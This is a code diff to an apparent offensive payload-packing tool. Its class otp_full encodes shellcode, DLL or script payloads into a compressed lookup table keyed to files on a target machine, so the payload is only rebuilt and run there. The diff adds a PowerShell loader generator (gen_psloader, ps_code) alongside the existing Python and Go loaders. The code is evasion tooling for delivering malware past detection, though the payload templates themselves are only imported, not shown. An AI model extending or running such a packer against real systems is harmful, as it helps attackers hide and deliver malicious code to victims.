@@ -19,6 +19,8 @@ from templates.python.payloads import drop_file
 from templates.go import go_otp_full_base
 from templates.go.payloads import go_win_shellcode
 from templates.go.payloads import go_memorymodule
+from templates.powershell import ps_otp_full_base
+from templates.powershell.payloads import ps_code
 from cleanup import removeCommentsGo
 from cleanup import removeCommentsPy
 
@@ -40,6 +42,7 @@ class otp_full:
         self.lookup_table = ''
         self.cleanup = cleanup
         self.file_suffix = ""
+        self.output_type = output_type
 
         self.set_payload()
 
@@ -63,10 +66,8 @@ class otp_full:
             self.gen_pyloader()
         elif output_type == 'go':
             self.gen_goloader()
-        elif output_type == 'both':
-            self.parse_py_payload()
-            self.gen_pyloader()
-            self.gen_goloader()
+        elif output_type == 'powershell':
+            self.gen_psloader()
 
     def set_payload(self):
         print "[*] Payload_type", self.payload_type
@@ -93,8 +94,9 @@ class otp_full:
             self.go_payload_loader = go_memorymodule.loader
             self.payload_imports = go_memorymodule.imports
             
-        elif self.payload_type == "code": # python code
+        elif self.payload_type == "code": # python or PS code
             self.payload_loader = code.loader
+            self.ps_payload_loader = ps_code.loader
 
         elif self.payload_type == "file_drop":
             if len(os.path.basename(self.org_payload).split('.')) > 2:
@@ -216,8 +218,10 @@ class otp_full:
         else:
             print "[*] Compression effective, saved %s bytes in size from original payload" % hex(len(self.payload) - len(self.payload_table))
         
-        
-        self.lookup_table = zlib.compress(struct.pack("<I", self.initial_iteration) + self.payload_table)
+        if self.output_type != "powershell":
+            self.lookup_table = zlib.compress(struct.pack("<I", self.initial_iteration) + self.payload_table)
+        else:
+            self.lookup_table = struct.pack("<I", self.initial_iteration) + self.payload_table
         
         #self.lookup_table = struct.pack("<I", self.initial_iteration) + self.lookup_table
 
@@ -279,6 +283,16 @@ class otp_full:
         self.payload_output = go_otp_full_base.buildcode.format(base64.b64encode(self.lookup_table), self.payload_hash, self.iterumhash,
                                                              self.minus_bytes, self.go_payload_loader, 
                                                              self.scan_dir, go_imports)
+        self.write_payload()
+
+    def gen_psloader(self):
+        self.payload_name = 'powershell_otp_full_' + os.path.basename(self.org_payload) + ".ps1"
+        print '[*] PS Payload hash (minus_bytes):', self.payload_hash
+        print '[*] PS Hash of full payload:', hashlib.sha512(self.payload).hexdigest()
+        print "[*] Writing PS payload to:", self.payload_name
+        
+        self.payload_output = ps_otp_full_base.buildcode.format(base64.b64encode(self.lookup_table), self.payload_hash, self.iterumhash,
+                                                             self.ps_payload_loader, self.minus_bytes, self.scan_dir)
         self.write_payload()
 
         
